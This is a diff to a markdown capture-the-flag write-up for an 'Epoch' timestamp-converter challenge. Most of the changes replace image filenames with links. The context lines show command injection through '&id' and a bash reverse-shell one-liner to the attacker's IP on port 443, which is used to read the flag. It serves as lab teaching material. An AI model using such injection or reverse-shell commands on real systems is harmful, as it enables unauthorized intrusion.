@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-epoch.png
+![epoch.png](../assets/epoch_assets/epoch.png)
 
 ```text
 Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!
@@ -124,13 +124,13 @@ Nmap done: 1 IP address (1 host up) scanned in 106.51 seconds
 
 Heading over to the site on port 80 we find a "Epoch to UTC convertor"
 
-site.png
+![site.png](../assets/epoch_assets/site.png)
 
 The instructions mention "Our website actually just passes your input right along to that command-line program!" so I'm wondering if we can get command execution here.
 
 Trying the command `id` fails, but if I enter `&id` id can print the user challenge's id:
 
-challenge.png
+![challenge.png](../assets/epoch_assets/challenge.png)
 
 Nice! This should be easily exploitable. 
 
@@ -142,7 +142,7 @@ sh -i >& /dev/tcp/10.6.61.45/443 0>&1
 
 We can execute it with:
 
-shell.png
+![shell.png](../assets/epoch_assets/shell.png)
 
 You'll notice the page just hangs, that's a good sign!
 
@@ -179,5 +179,11 @@ We can take a look at environment variables by running `printenv`
 
 Which  gives us our flag:
 
-flag.png
+![flag.png](../assets/epoch_assets/flag.png)
+
+Thanks for following along!
+
+-Ryan
+
+-------------------------------------------------------
 
